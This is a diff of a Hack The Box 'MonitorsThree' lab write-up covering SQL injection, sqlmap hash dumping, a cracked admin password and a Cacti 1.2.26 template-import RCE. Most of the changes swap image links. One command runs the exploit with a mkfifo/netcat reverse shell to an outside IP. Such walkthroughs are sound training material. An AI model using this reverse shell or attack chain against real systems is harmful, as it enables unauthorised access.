@@ -35,7 +35,8 @@ Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
 
 There is SQL injection on the forgot password page here:
 
-![87a47714dbabb2c8a2718f6dffba59dc.png](../../../../_resources/87a47714dbabb2c8a2718f6dffba59dc.png)
+![image](https://github.com/user-attachments/assets/a4fae5cc-f532-49bb-8228-d0d3068cd8f1)
+
 
 Verified with the input '.
 
@@ -43,7 +44,8 @@ It might be blind, which would be somewhat difficult.
 
 I captured the request sent via burpsuite and put it into a txt file, then used sqlmap to dump the contents of the database:
 
-![f8705210e7dd5cec47d6ec19f2b9fbd0.png](../../../../_resources/f8705210e7dd5cec47d6ec19f2b9fbd0.png)
+![image](https://github.com/user-attachments/assets/406a8e21-219c-4911-a3a6-319dfd25b8ea)
+
 
 This allowed me to acquire 4 hashes:
 
@@ -60,7 +62,7 @@ admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8:greencacti2001
 
 I then attempted to crack the hashes via hashcat, however only one was successful:
 
-![1735c8eea85caf68dbaeebd7ec9ccfa0.png](../../../../_resources/1735c8eea85caf68dbaeebd7ec9ccfa0.png)
+![image](https://github.com/user-attachments/assets/cd1525d1-e676-4067-b633-1e9963aba433)
 
 We now have the credentials for admin@monitorsthree.htb.
 
@@ -70,13 +72,14 @@ We now have the credentials for admin@monitorsthree.htb.
 
 I found a cacti subdomain:
 
-![23d1d19eea398363b2d2b09fda498b28.png](../../../../_resources/23d1d19eea398363b2d2b09fda498b28.png)
+![image](https://github.com/user-attachments/assets/027392ce-169d-4c77-88b8-8cf7f41c7102)
 
 Add this to /etc/hosts.
 
 We now have access to cacti with the admin credentials:
 
-![729b187df6d1fb53dace4f0e404a9b80.png](../../../../_resources/729b187df6d1fb53dace4f0e404a9b80.png)
+![image](https://github.com/user-attachments/assets/380380ca-0ca6-44a3-8da8-23b43181b2a3)
+
 
 Cacti 1.2.26 suffers from rce via import template.
 
@@ -86,16 +89,9 @@ https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26
 my-venv/bin/python3 CVE-2024-25641.py --user admin --pass greencacti2001 --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" http://cacti.monitorsthree.htb/cacti/
 ```
 
-![19df152b8325579e01ff1d6f670f08e8.png](../../../../_resources/19df152b8325579e01ff1d6f670f08e8.png)
+![image](https://github.com/user-attachments/assets/373304ee-4591-4022-ac3d-dce61361783d)
+
 
 &nbsp;
 
-Marcus is a user of cacti, and is also the only user on the machine:
-
-![434874204e3549add6b2dfb00dc84d00.png](../../../../_resources/434874204e3549add6b2dfb00dc84d00.png)
-
-Now we have access to the machine, I find the sql database has the base cactiuser enabled, meaning we should be able to auth as that user and access the hashed credentials of marcus which we could then attempt to crack.
-
-![e7de064f30575ba6f4a8606986748179.png](../../../../_resources/e7de064f30575ba6f4a8606986748179.png)
-
-Maybe crackable?
+# Privilege Escalation
